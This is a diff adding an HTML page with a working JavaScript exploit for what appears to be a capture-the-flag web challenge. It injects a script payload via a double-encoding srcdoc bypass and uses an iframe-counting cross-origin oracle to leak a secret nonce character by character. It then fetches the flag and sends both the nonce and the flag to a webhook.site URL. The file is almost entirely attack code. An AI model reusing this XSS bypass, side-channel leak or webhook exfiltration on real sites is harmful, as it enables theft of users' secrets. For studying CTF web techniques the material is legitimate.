@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<body>
+<pre id="log"></pre>
+<script>
+const CHALL = 'https://notes.chall.lac.tf';
+const WEBHOOK = 'https://webhook.site/923f4208-02d7-482e-ae22-6d7e0278f8d7';
+const HEX = '0123456789abcdef';
+
+function log(m) {
+  document.getElementById('log').textContent += m + '\n';
+}
+
+function sleep(ms) {
+  return new Promise(r => setTimeout(r, ms));
+}
+
+// Test all 16 hex chars for one nonce position in parallel
+async function testPosition(prefix) {
+  const results = {};
+  for (const c of HEX) results[c] = { ad: 0, total: 0 };
+
+  const handler = (e) => {
+    const d = e.data;
+    if (d && typeof d.c === 'string' && results[d.c]) {
+      results[d.c].ad++;
+      results[d.c].total = d.t;
+    }
+  };
+  window.addEventListener('message', handler);
+
+  const iframes = [];
+  for (const c of HEX) {
+    // This script runs inside each ad iframe's srcdoc context.
+    // createHTML HTML-encodes it, but the srcdoc parser decodes entities,
+    // recovering our original <script> tags - a double-encoding bypass!
+    const payload = "<script>try{window.top.postMessage({t:window.parent.length,c:'" + c + "'},'*')}catch(e){}<\/script>";
+    const url = CHALL + '/?srcdoc=x&referrerPolicy=' + encodeURIComponent(payload)
+              + '&search=' + encodeURIComponent(prefix + c);
+    const f = document.createElement('iframe');
+    f.src = url;
+    f.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
+    document.body.appendChild(f);
+    iframes.push(f);
+  }
+
+  await sleep(3000);
+
+  window.removeEventListener('message', handler);
+  iframes.forEach(f => f.remove());
+
+  // The oracle: if total_frames > ad_count, a note iframe exists => prefix matched
+  for (const c of HEX) {
+    const r = results[c];
+    log('  ' + c + ': ads=' + r.ad + ' total=' + r.total + ' notes=' + (r.total - r.ad));
+    if (r.ad > 0 && r.total > r.ad) {
+      return c;
+    }
+  }
+  return null;
+}
+
+async function solve() {
+  log('Starting nonce leak...');
+  let nonce = '';
+
+  for (let pos = 0; pos < 8; pos++) {
+    let found = null;
+    for (let attempt = 0; attempt < 3 && !found; attempt++) {
+      log('Position ' + pos + ', attempt ' + attempt + ', prefix="' + nonce + '"');
+      found = await testPosition(nonce);
+    }
+    if (found) {
+      nonce += found;
+      log('=> nonce so far: ' + nonce);
+    } else {
+      log('FAILED at position ' + pos);
+      // Report partial nonce to webhook for debugging
+      new Image().src = WEBHOOK + '?partial=' + encodeURIComponent(nonce) + '&pos=' + pos;
+      break;
+    }
+  }
+
+  if (nonce.length === 8) {
+    log('Full nonce: ' + nonce);
+    // /guess has Access-Control-Allow-Origin: * so we can fetch cross-origin
+    const resp = await fetch(CHALL + '/guess?nonce=' + nonce);
+    const flag = await resp.text();
+    log('FLAG: ' + flag);
+    // Send flag to webhook
+    fetch(WEBHOOK + '?flag=' + encodeURIComponent(flag));
+    new Image().src = WEBHOOK + '?flag=' + encodeURIComponent(flag);
+  }
+}
+
+solve();
+</script>
+</body>
+</html>
